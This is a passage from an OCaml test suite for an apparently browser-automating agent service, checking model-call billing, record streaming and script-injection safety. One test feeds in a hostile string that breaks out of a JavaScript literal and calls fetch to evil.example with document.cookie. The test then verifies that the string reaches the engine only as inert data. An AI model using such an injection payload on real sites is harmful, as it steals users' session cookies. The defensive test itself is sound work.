          script_page f ~reply:(fun _ _ -> value_reply books_rows);
          let h =
            result (request tabs "alice" (P.New { url = Some product_url })) |> tab
          in
          let questions = ref [] in
          let base = levels_with [ "books.example"; "collect"; "DONE" ] questions in
          let levels =
            Run.
              {
                base with
                choose =
                  (fun ~deadline question ->
                    let kind =
                      if question.Run.name = "select_playbook" then "playbook"
                      else "procedure"
                    in
                    Leash__Model_usage.start kind;
                    let answer = base.choose ~deadline question in
                    Leash__Model_usage.report kind
                      (Some (if kind = "playbook" then 0.1 else 0.2));
                    answer);
              }
          in
          let text_helper () =
            {
              Leash.Text_helper.complete =
                (fun ?deadline:_ _ ->
                  Leash__Model_usage.start "text_helper";
                  Leash__Model_usage.report "text_helper" None;
                  Ok (Some hostile));
            }
          in
          let decide ~deadline request =
            Leash__Model_usage.start "operator";
            let answer = decide_done ~deadline request in
            Leash__Model_usage.report "operator" (Some 0.4);
            answer
          in
          let reply =
            with_ticking_clock env sw (fun () ->
                handle_with ~levels ~text_helper ~decide ~installed:[ book ] tabs "alice"
                  (P.Drive
                     {
                       tab = Some h;
                       mission = "collect the books " ^ hostile;
                       max_steps = None;
                       start_url = None;
                       max_procedures = None;
                       deadline_s = None;
                       dry_run = None;
                       expect = None;
                       out;
                     }))
          in
          (result reply, payloads f, script_calls f, !questions)))

let run_script_step () =
  let hostile = "'); fetch('https://evil.example/steal?c='+document.cookie); ('" in
  let body, payloads_seen, calls, model_requests = run_scripts hostile in
  let billed = get "model_calls_by_kind" (get "data" body) in
  Alcotest.(check int)
    "extr-5x9e every actual model request" 4
    (match get "model_calls" body with `Int n -> n | _ -> -1);
  List.iter
    (fun (kind, expected) ->
      Alcotest.(check bool)
        ("extr-5x9e " ^ kind ^ " call count")
        true
        (get kind billed = `Int expected))
    [ ("playbook", 1); ("procedure", 2); ("text_helper", 1) ];
  Alcotest.(check bool)
    "fly-gn5z an unpriced helper makes model_cost unknown" true
    (get "model_cost" body = `Null);
  Alcotest.(check bool)
    "fly-gn5z reported_cost is the known subtotal" true
    (match get "reported_cost" (get "data" body) with
    | `Float cost -> Float.abs (cost -. 0.5) < 0.00001
    | _ -> false);
  Alcotest.(check bool)
    "extr-5x9e missing helper cost shown" true
    (get "cost_unreported" (get "data" body) = `Int 1);
  Alcotest.(check bool)
    "fly-mqkr output_kinds names the script records" true
    (match get "output_kinds" body with
    | `List kinds -> List.mem (str "script-record") kinds
    | _ -> false);
  List.iter
    (fun (question : Run.question) ->
      let text = Yojson.Safe.to_string question.state in
      Alcotest.(check bool)
        "extr-b3u0 records never enter recorded model payloads" false
        (contains text "A Light in the Attic" || contains text "Tipping the Velvet"))
    model_requests;
  let path = Filename.temp_file "leash-extr-b3u0" ".jsonl" in
  Fun.protect
    ~finally:(fun () -> Sys.remove path)
    (fun () ->
      let streamed, _, _, requests = run_scripts ~out:path "gpu" in
      let input = open_in_bin path in
      let rows =
        Fun.protect
          ~finally:(fun () -> close_in input)
          (fun () ->
            let rec lines acc =
              match input_line input with
              | line -> lines (Yojson.Safe.from_string line :: acc)
              | exception End_of_file -> List.rev acc
            in
            lines [])
      in
      let tagged kind =
        List.filter_map
          (fun line ->
            match line with
            | `Assoc fields when List.assoc_opt "kind" fields = Some (str kind) ->
                Some fields
            | _ -> None)
          rows
      in
      let records =
        List.filter_map
          (fun fields -> List.assoc_opt "record" fields)
          (tagged "script-record")
      in
      Alcotest.(check bool)
        "fly-mqkr streamed lines are tagged" true
        (List.length rows
        = List.length (tagged "script-record") + List.length (tagged "operator-state"));
      Alcotest.(check bool)
        "fly-mqkr script-record lines carry the validated records" true
        (records = match books_rows with `List rows -> rows | _ -> assert false);
      List.iter
        (fun fields ->
          Alcotest.(check bool)
            "fly-mqkr script records name the playbook lane" true
            (List.assoc_opt "source" fields = Some (str "playbook")
            && List.assoc_opt "script" fields = Some (str "list")
            &&
            match List.assoc_opt "playbook" fields with
            | Some (`String id) -> String.starts_with ~prefix:"book:" id
            | _ -> false))
        (tagged "script-record");
      Alcotest.(check bool)
        "extr-b3u0 bounded reply count" true
        (get "count" (get "data" streamed) = `Int 2);
      List.iter
        (fun (q : Run.question) ->
          Alcotest.(check bool)
            "extr-b3u0 JSONL records absent from every model request" false
            (contains (Yojson.Safe.to_string q.state) "A Light in the Attic"))
        requests);
  Alcotest.(check bool) "extr-8o1h the run is done" true (get "status" body = str "done");
  Alcotest.(check bool)
    "extr-8o1h the runner counts the records; no model sees them" true
    (get "collected" body = `Int 2);
  (match get "procedures" body with
  | `List [ entry ] -> (
      match get "scripts" entry with
      | `List [ call ] ->
          Alcotest.(check bool)
            "extr-p152 the trace names the script" true
            (get "script" call = str "list");
          Alcotest.(check bool)
            "extr-p152 the page it ran on" true
            (get "url" call = str product_url);
          Alcotest.(check bool) "extr-p152 its records" true (get "records" call = `Int 2)
      | _ -> Alcotest.fail "extr-p152 the procedure traces no script")
  | _ -> Alcotest.fail "extr-8o1h the trace is not one procedure");
  (* extr-k40c: the script text is the loaded file's, the hostile value is data. *)
  (match calls with
  | [ call ] ->
      Alcotest.(check bool)
        "extr-k40c the function is the playbook's text, unchanged" true
        (get "functionDeclaration" call = str (wrapped list_js));
      Alcotest.(check bool)
        "extr-k40c the model-filled value travels as a JSON argument" true
        (get "arguments" call = `List [ obj [ ("value", obj [ ("q", str hostile) ]) ] ])
  | _ -> Alcotest.failf "extr-k40c %d script calls" (List.length calls));
  List.iter
    (fun text ->
      Alcotest.(check bool)
        "extr-k40c no model text in anything the engine is handed" false
        (contains text "evil.example" || contains text "document.cookie"))
    payloads_seen;
  (* Everything else the engine was handed is what a run with a harmless mission hands it. *)
  let _, baseline, _, _ = run_scripts "gpu" in
  let own text = not (String.starts_with ~prefix:"async function(args)" text) in
  let baseline = List.filter own baseline in
  List.iter
    (fun text ->
      if own text then
        Alcotest.(check bool)
          "extr-k40c only the service's own fixed texts and the playbook's scripts reach \
           the engine"
          true (List.mem text baseline))
    payloads_seen;
  Alcotest.(check bool)
    "extr-k40c and the hostile run handed the engine the same own texts" true
    (List.sort_uniq compare (List.filter own payloads_seen)
    = List.sort_uniq compare baseline)

let () =
  Alcotest.run "L3 control protocol"
    [
      ( "lifecycle",
        [
          Alcotest.test_case "tab-of0i tmoc 1r34 hyap 1rx9 0vh8" `Quick snapshot;
          Alcotest.test_case "daily-9ggi HiDPI controls and paragraph text" `Quick
            daily_snapshot;
          Alcotest.test_case "chrome-qnul hjw9 fuao 2n8n" `Quick lifecycle;
          Alcotest.test_case "svc-p67t qilu journal and redaction" `Quick
            journal_redaction;
          Alcotest.test_case "run-ykq4 fake Chrome downloads" `Quick download_events;
          Alcotest.test_case "svc-f4op optional OTLP reporter" `Quick optional_otlp;
          Alcotest.test_case "chrome-akz4 d4mz" `Quick safety;
          Alcotest.test_case "chrome-1yn9" `Quick nav;
          Alcotest.test_case "chrome-qnul new waits" `Quick new_waits;
          Alcotest.test_case "chrome-qnul new without url" `Quick new_without_url;
          Alcotest.test_case "hard-6eei 92ik s719 tsva t6cq owci" `Quick
            dialog_interruptions;
          Alcotest.test_case "chrome-qnul 1yn9 load timeout" `Quick load_timeout;
          Alcotest.test_case "chrome-qnul 1yn9 handler budget" `Quick budget;
          Alcotest.test_case "chrome-38a4" `Quick malformed;
          Alcotest.test_case "chrome-2z2z 6lfk" `Quick lost;
          Alcotest.test_case "chrome-fwnu socket" `Quick socket;
          Alcotest.test_case "hard-yi0a real socket timeout" `Quick listener_budget_reply;
          Alcotest.test_case "svc-5wm8 second instance" `Quick second_instance;
          Alcotest.test_case "tab-x4v0 large text over socket" `Quick
            large_text_over_socket;
          Alcotest.test_case "human-origin shutdown" `Quick human;
          Alcotest.test_case "tab-zc36 empty names" `Quick empty_names;
          Alcotest.test_case "tab-bw4j pseudo-icon click safety" `Quick pseudo_icon_hit;
          Alcotest.test_case "drive-l7yk fake-browser dry-run" `Quick drive_dry_run;
          Alcotest.test_case "run-9ypy run-4j1v run-snk4 run-shgh run-7blx" `Quick
            run_mission;
          Alcotest.test_case "daily-9ggi temporary drive tabs" `Quick
            drive_temporary_cleanup;
          Alcotest.test_case "run-fwl8 run refusals" `Quick run_refusals;
          Alcotest.test_case "run-rq6i run-m0r8 planner proposal" `Quick run_proposal;
          Alcotest.test_case "run-3vat run-xda7 discover proposal" `Quick
            discover_proposal;
        ] );
      ( "L37 scripts",
        [
          Alcotest.test_case "extr-mp5z extr-8o1h extr-vgir playbook test" `Quick
            playbook_test_command;
          Alcotest.test_case "extr-lslp playbook check" `Quick playbook_check_command;
          Alcotest.test_case "extr-8o1h extr-k40c extr-p152 script step, safety" `Quick
            run_script_step;
        ] );
    ]
